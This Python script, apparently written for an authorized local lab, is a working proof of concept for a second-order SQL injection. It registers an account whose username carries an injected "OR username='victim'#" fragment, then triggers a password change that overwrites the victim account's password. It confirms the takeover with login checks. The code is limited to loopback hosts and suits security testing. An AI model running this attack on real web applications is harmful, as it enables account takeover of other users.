#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SQLI-005 local-lab second-order SQL injection draft (NOT executed).

Scope: loopback only, no redirect following, no data enumeration.
Flow: baseline victim login -> register probe account with crafted username
      -> probe login (SESSION username = stored value) -> change password
      -> victim login with the new password (cross-account write evidence).
The payload is bounded to the victim probe row, so no unrelated row is updated.
"""

import argparse
import http.cookiejar
import sys
import urllib.error
import urllib.parse
import urllib.request
from urllib.parse import urlparse

LOOPBACK_HOSTS = ("localhost", "127.0.0.1", "::1")


class NoRedirect(urllib.request.HTTPRedirectHandler):
    """Do not follow 3xx automatically; the caller inspects Location itself."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def new_opener():
    jar = http.cookiejar.CookieJar()
    return urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar), NoRedirect()
    )


def refuse_unless_loopback(base_url):
    parsed = urlparse(base_url)
    if parsed.scheme not in ("http", "https"):
        sys.exit("REFUSE: unsupported scheme %r" % (parsed.scheme,))
    if parsed.hostname not in LOOPBACK_HOSTS:
        sys.exit("REFUSE: host %r is not loopback" % (parsed.hostname,))


def post_form(opener, url, fields, timeout):
    payload = urllib.parse.urlencode(fields).encode("utf-8")
    request = urllib.request.Request(url, data=payload, method="POST")
    request.add_header("Content-Type", "application/x-www-form-urlencoded")
    request.add_header("User-Agent", "sqli005-draft/1.0 (local lab)")
    try:
        with opener.open(request, timeout=timeout) as response:
            body = response.read().decode("utf-8", "replace")
            return response.status, response.headers, body
    except urllib.error.HTTPError as err:
        body = err.read().decode("utf-8", "replace")
        return err.code, err.headers, body
    except urllib.error.URLError as err:
        sys.exit("NETWORK: %s" % (err.reason,))
    except TimeoutError:
        sys.exit("TIMEOUT after %s seconds" % (timeout,))


def login(opener, login_url, user, password, timeout):
    status, headers, body = post_form(
        opener, login_url, {"login_user": user, "login_password": password}, timeout
    )
    location = headers.get("Location", "") if headers is not None else ""
    return status, location, body


def main():
    parser = argparse.ArgumentParser(
        description="SQLI-005 second-order SQLi draft for an authorized local lab"
    )
    parser.add_argument("--base-url", required=True)
    parser.add_argument("--register-path", required=True)
    parser.add_argument("--login-path", required=True)
    parser.add_argument("--change-path", required=True)
    parser.add_argument(
        "--login-success-fragment",
        default="logged-in.php",
        help="substring expected in Location after a successful login (from the sample code)",
    )
    parser.add_argument("--victim-user", required=True)
    parser.add_argument("--victim-password", required=True)
    parser.add_argument("--probe-prefix", default="wp2probe")
    parser.add_argument("--probe-password", required=True)
    parser.add_argument("--new-victim-password", required=True)
    parser.add_argument("--timeout", type=float, default=10.0)
    args = parser.parse_args()

    refuse_unless_loopback(args.base_url)
    base = args.base_url.rstrip("/") + "/"
    register_url = urllib.parse.urljoin(base, args.register_path.lstrip("/"))
    login_url = urllib.parse.urljoin(base, args.login_path.lstrip("/"))
    change_url = urllib.parse.urljoin(base, args.change_path.lstrip("/"))

    def logged_in(status, location):
        return status in (301, 302, 303) and args.login_success_fragment in location

    # Step 1: baseline, the dedicated victim account must work before the test.
    status, location, _ = login(
        new_opener(), login_url, args.victim_user, args.victim_password, args.timeout
    )
    if not logged_in(status, location):
        sys.exit("ABORT: baseline victim login failed (status=%s)" % (status,))
    print("[1] baseline victim login ok (status=%s)" % (status,))

    # Step 2: register a probe account whose stored username is a SQL fragment.
    crafted = "%s' OR username='%s'#" % (args.probe_prefix, args.victim_user)
    status, _, body = post_form(
        new_opener(),
        register_url,
        {
            "submit": "Submit",
            "username": crafted,
            "password": args.probe_password,
            "re_password": args.probe_password,
        },
        args.timeout,
    )
    if "already exists" in body.lower():
        sys.exit("ABORT: probe username already exists; change --probe-prefix")
    if "Redirecting you to login page" not in body:
        sys.exit(
            "ABORT: registration of the crafted username was rejected (status=%s)" % (status,)
        )
    print("[2] probe account with crafted username created (status=%s)" % (status,))

    # Step 3: log in as the probe account; the DB value becomes SESSION username.
    probe_opener = new_opener()
    status, location, _ = login(
        probe_opener, login_url, crafted, args.probe_password, args.timeout
    )
    if not logged_in(status, location):
        sys.exit("ABORT: probe login failed (status=%s); escaping/encoding mismatch" % (status,))
    print("[3] probe login ok, SESSION username holds the crafted value")

    # Step 4: trigger the UPDATE with the unescaped SESSION username.
    status, _, body = post_form(
        probe_opener,
        change_url,
        {
            "submit": "Submit",
            "current_password": args.probe_password,
            "password": args.new_victim_password,
            "re_password": args.new_victim_password,
        },
        args.timeout,
    )
    updated = "Password successfully updated" in body
    print("[4] change-password status=%s success_marker=%s" % (status, updated))

    # Step 5: cross-account evidence, with independent cookie jars.
    status_new, loc_new, _ = login(
        new_opener(), login_url, args.victim_user, args.new_victim_password, args.timeout
    )
    status_old, loc_old, _ = login(
        new_opener(), login_url, args.victim_user, args.victim_password, args.timeout
    )
    status_probe, loc_probe, _ = login(
        new_opener(), login_url, crafted, args.probe_password, args.timeout
    )

    print(
        "[5] victim login with new password: status=%s location=%s ok=%s"
        % (status_new, loc_new, logged_in(status_new, loc_new))
    )
    print(
        "[6] victim login with old password: status=%s location=%s ok=%s"
        % (status_old, loc_old, logged_in(status_old, loc_old))
    )
    print(
        "[7] probe account still logs in: ok=%s" % (logged_in(status_probe, loc_probe),)
    )

    hit = (
        updated
        and logged_in(status_new, loc_new)
        and not logged_in(status_old, loc_old)
        and logged_in(status_probe, loc_probe)
    )
    if hit:
        print("OBSERVED: UPDATE matched the victim row reached through the injected OR")
        return 0
    print("NOT OBSERVED: manual triage required, see statuses above")
    return 1


if __name__ == "__main__":
    sys.exit(main())
